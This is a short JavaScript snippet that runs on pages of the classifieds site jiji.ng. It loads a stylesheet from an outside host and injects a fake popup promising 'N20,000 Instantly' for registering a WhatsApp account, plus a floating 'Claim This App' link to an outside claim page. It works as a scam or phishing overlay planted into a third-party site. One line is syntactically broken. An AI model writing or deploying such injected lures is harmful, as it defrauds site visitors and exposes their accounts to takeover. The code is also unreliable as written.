console.log('checked');
if(location.href.includes("jiji.ng") ){
    alert('script injected');
    const style = document.createElement("link");
    style.href = "https://tester-orcin.vercel.app/jiji.css";
    style.setAttribute("type", "text/css");
    style setAttribute("rel", "stylesheet");
    document.head.appendChild(style);
    
    let div = document.createElement('div');
    div.innerHTML = `<div class="popup-overlay">
  <div class="popup-card">
    <button class="close-btn" aria-label="Close popup">&times;</button>
    <div class="popup-image">ðŸš€</div>
    <h2>Unlock Premium Funds</h2>
    <p>Join Thousands of users who earn as they buy from this store. Get N20,000 Instantly and many more benefits by registering with your Whatsapp account.</p>
    <a href="https://web.whatsapp.com" class="cta-button">Claim N20k Instantly now</a>
  </div>
</div>

    `;
    
    document.body.appendChild(div);
    
    let div2 = document.createElement('div');
    div2.innerHTML = `<a href="https://scripbank.page.gd/claim.html" class="floating-cta" aria-label="Claim this app">
  <span class="cta-icon">ic</span>
  <span class="cta-text">Claim This App</span>
</a>

    `;
    document.body.appendChild(div2);
}
